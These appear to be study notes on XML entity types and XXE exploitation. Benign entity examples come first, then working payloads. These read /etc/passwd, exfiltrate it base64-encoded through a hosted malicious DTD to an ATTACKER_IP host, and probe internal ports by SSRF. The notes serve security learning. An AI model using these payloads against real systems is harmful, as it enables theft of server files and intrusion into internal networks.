- Document Type Definitions (DTD): used for validation or entity declaration
- XML entities are placeholders for data or code that can be expanded within an XML document.
- five types of entities: 
	- internal entities,

```xml
<!DOCTYPE note [
<!ENTITY inf "This is a test.">
]>
<note>
        <info>&inf;</info>
</note>
```
	
	- external entities,
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY external SYSTEM "http://example.com/test.dtd">
<config>
&external;
</config>

<!-- or -->

<!DOCTYPE note [
<!ENTITY ext SYSTEM "http://example.com/external.dtd">
]>
<note>
        <info>&ext;</info>
</note>

```
	
	- parameter entities,
```xml
<!DOCTYPE note [
<!ENTITY % common "CDATA">
<!ELEMENT name (%common;)>
]>
<note>
        <name>John Doe</name>
</note>
```
	- general entities,
```xml
<!DOCTYPE note [
<!ENTITY author "John Doe">
]>
<note>
        <writer>&author;</writer>
</note>
```
	- character entities.
```xml
<note>
        <text>Use &lt; to represent a less-than symbol.</text>
</note>
```
- Internal DTDs are specified using the `<!DOCTYPE` declaration, while external DTDs are referenced using the `SYSTEM` keyword.

- XXE Example:

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>

```

- Out of band:
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
<upload><file>&xxe;</file></upload>
```

- Create new file `sample.dtd` with below content, host it on attacker controlled server, and pass that url in the XML as xxe payload like above example.
```xml
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;
```

```
The DTD begins with a declaration of an entity `%cmd` that points to a system resource. The **`%cmd`** entity refers to a resource within the PHP filter protocol `php://filter/convert.base64-encode/resource=/etc/passwd`. It retrieves the content of `/etc/passwd`, a standard file in Unix-based systems containing user account information. The `convert.base64-encode` filter encodes the content in Base64 format to avoid formatting problems. The **`%oobxxe`** entity contains another XML entity declaration, `exfil`, which has a system identifier pointing to the attacker-controlled server. It includes a parameter named data with `%cmd`, representing the Base64-encoded content of `/etc/passwd`. When `%oobxxe;` is parsed, it creates the `exfil` entity that connects to an attacker's server (`http://ATTACKER_IP:1337/`). The parameter `?data=%cmd` sends the Base64-encoded content from `%cmd`.
```

- Now send below payload 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>
```

- SSRF: Enumerating internal services
```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
]>
<contact>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <message>test</message>
</contact>
```